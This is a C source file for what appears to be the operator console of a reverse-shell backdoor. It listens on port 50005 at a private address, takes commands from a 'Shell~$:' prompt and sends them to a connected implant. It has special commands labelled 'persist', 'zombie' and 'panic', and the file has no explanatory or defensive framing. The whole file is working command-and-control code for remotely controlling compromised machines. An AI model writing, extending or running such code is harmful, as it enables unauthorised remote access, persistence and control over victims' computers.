#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>

//Regular text
#define BLK "\e[0;30m"
#define RED "\e[0;31m"
#define GRN "\e[0;32m"
#define YEL "\e[0;33m"
#define BLU "\e[0;34m"
#define MAG "\e[0;35m"
#define CYN "\e[0;36m"
#define WHT "\e[0;37m"

int PORT = 50005;

void printsh(char* s){
	printf(BLU);
	printf("[");
	printf(MAG);
	printf("-");
	printf(BLU);
	printf("] ");
	printf(WHT);
	printf("%s",s);
}

void printsuc(char* s){
	printf(BLU);
	printf("[");
	printf(GRN);
	printf("+");
	printf(BLU);
	printf("] ");
	printf(WHT);
	printf("%s",s);
}
void printerr(char* s){
	printf(BLU);
	printf("[");
	printf(RED);
	printf("-");
	printf(BLU);
	printf("] ");
	printf(WHT);
	printf("%s",s);
}

int main(){
	printsuc("Welcome to EP server console. Use q to quit\n");
	printsuc("Starting Server..(Port:50005)\n");
	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_address, client_address;
	int i=0;
	int optval = 1;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0 ){
		printerr("Error Setting TCP Socket options\n");
		return 1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("192.168.174.129");//Server address
	server_address.sin_port = htons(50005);

	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
	listen(sock, 5);
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
	printsuc("");	
	printf("Connection established @ %s \n", inet_ntoa(client_address.sin_addr));
	while(1){
		jump:
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printsh("Shell~$:");
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");//deletes \n
		write(client_socket, buffer, sizeof(buffer));
		if(strncmp("q", buffer, 1) == 0){
			break;
		}
		else if(strncmp("cd ",buffer,3) == 0){
			goto jump;
		}
		else if (strncmp("persist",buffer,7)==0){
			recv(client_socket, response, sizeof(response), 0);
			printsuc(response);
		}
		else if (strncmp("zombie",buffer,6)==0){
			recv(client_socket, response, sizeof(response), 0);
			printsuc(response);
			break;
		}
		else if (strncmp("panic",buffer,5)==0){
			recv(client_socket, response, sizeof(response), 0);
			printsuc(response);
		}
		else{
			recv(client_socket, response, sizeof(response), MSG_WAITALL);
			printf("%s",response);
		}
	}
}
